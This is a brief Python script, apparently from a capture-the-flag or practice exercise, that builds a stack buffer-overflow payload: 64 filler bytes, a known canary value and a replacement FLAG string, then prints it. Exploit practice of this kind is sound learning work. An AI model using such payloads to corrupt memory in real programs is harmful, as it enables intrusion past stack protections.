# Fill buffer up to var_48
buffer = b"A" * 64

# Correct canary value 'canary\x00' (7 bytes including null terminator)
canary = b"canary\x00"

# New FLAG value (e.g., 'NEWFLAG\0' to fit in 8 bytes)
new_flag = b"NEWFLAG\x00"

# Combine buffer, canary, and new FLAG value into the final payload
payload = buffer + canary + new_flag

# Print or use the payload
print(payload)
